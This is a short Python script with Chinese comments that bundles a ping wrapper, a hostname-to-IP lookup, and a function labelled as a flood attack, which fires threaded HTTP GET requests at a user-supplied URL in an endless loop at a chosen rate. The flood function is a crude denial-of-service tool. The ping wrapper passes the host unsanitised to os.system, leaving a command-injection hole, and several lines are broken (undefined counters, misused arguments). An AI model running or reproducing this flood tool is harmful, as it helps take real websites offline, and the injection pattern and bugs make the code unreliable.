import os
from socket import gethostbyname
import threading
import requests
import meo

headers = {
    "User-Agent": meo.net.UserAgent.FIREFOX.value
}

# ping
def ping(host):
    os.system("ping "+ host)

# 获取ip
def getip(name):
    try:
        print("ip:"+gethostbyname(name))
    except:
        print("\a未检测到ip\n请检查网络是否正常或域名是否正确")


# 洪水攻击
def startattack(url, headers=headers):
    nf = 0
    def attack(speed):
        for i in range(speed):
            try:
                r = requests.get(url, headers)
            except:
                # print("发送失败")
                nf += speed - i
                break

    try:
        speed = int(input("请输入攻击速度(小心卡死自己):"))
    except:
        speed = 10
        print("未设置速度默认为10")
    while 1:
        n += speed
        t1 = threading.Thread(target=attack, args=(speed,))
        t1.start()
        print(f"\r已发送{n}个包，失效{nf}个包", end="")
